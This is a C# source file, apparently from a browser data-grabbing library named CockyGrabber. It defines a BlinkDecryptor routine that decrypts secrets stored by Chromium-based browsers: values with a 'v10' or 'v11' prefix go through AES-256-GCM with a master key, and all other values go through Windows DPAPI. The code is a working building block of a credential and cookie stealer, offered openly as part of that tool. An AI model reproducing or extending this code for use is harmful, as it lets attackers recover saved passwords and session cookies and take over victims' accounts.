using System.Linq;
using System.Text;
using CockyGrabber.Utility.Cryptography.BouncyCastle;

namespace CockyGrabber.Utility.Cryptography
{
    internal static class BlinkDecryptor
    {
        /// <summary>
        /// Decrypt a blink AES256GCM encrypted value
        /// </summary>
        /// <param name="byteValue">Value to decrypt</param>
        /// <param name="key">Master Key</param>
        /// <returns>Decrypted value as a string</returns>
        public static string DecryptValue(byte[] byteValue, KeyParameter key)
        {
            if (byteValue[0] == 'v' && byteValue[1] == '1' && (byteValue[2] == '0' || byteValue[2] == '1'))
            {
                byte[] iv = byteValue.Skip(3).Take(12).ToArray(); // From 3 to 15
                byte[] payload = byteValue.Skip(15).ToArray();    // from 15 to end

                return Aes256GcmDecryptor.Decrypt(payload, key, iv); // Decrypt with AES256GCM
            }
            else
            {
                return Encoding.Default.GetString(DPAPI.Decrypt(byteValue)); // Decrypt with DPAPI
            }
        }
    }
}